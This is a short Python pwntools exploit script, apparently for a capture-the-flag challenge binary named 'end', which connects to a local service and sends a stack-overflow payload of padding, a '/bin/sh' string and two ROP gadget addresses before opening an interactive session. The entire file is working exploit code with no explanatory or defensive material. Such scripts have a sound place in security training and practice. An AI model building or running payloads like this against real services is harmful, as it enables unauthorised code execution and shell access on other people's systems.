#!/usr/bin/env python
from pwn import *

context(arch = "amd64", os = "linux", bits = 64)

DEBUG = True
if DEBUG:
    # p = process("end")
    p = remote("127.0.0.1", 8888)

ret = 0x00000000004000ea
add_rsp = 0x0000000000400103
payload1  = "A" * 128 + "/bin/sh\x00"
payload1 += "A" * (296-len(payload1))
payload2  = payload1 + p64(add_rsp) + p64(ret)
payload2 += "A" * (315-len(payload2))

raw_input()
p.send(payload2)
p.interactive()
p.close()
